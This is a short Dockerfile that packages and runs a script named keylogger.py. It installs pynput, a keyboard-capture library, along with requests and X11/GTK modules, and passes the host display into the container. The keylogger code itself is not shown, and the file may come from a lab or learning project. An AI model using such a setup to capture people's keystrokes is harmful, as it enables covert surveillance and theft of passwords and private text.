FROM python:latest

WORKDIR /app

ENV DISPLAY=$DISPLAY

COPY . .

RUN apt-get update && \
    apt-get -y install sudo

RUN apt-get install -y dbus-x11 packagekit-gtk3-module libcanberra-gtk-module 

RUN pip install requests pynput

CMD ["python",  "keylogger.py"]
